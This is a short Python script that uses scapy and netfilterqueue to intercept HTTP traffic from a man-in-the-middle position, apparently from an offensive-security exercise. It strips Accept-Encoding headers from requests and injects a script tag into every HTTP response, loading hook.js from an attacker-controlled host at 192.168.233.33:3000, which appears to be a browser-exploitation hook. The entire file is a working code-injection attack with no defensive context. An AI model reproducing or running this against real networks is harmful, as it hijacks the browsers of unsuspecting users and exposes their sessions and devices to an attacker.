#!/usr/bin/env python3

import scapy.all as scapy
import netfilterqueue
import re


def modify_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] HTTP Request")
                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "",
                                       scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore'))
                scapy_packet[scapy.Raw].load = bytes(modified_load, 'utf-8')

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                packet.set_payload(bytes(scapy_packet))

            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] HTTP Response")
                modified_load = scapy_packet[scapy.Raw].load.replace(b'<head>', b'<script src="http://192.168.233.33:3000/hook.js" defer></script>'b"<head>")
                scapy_packet[scapy.Raw].load = modified_load
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, modify_packet)
queue.run()
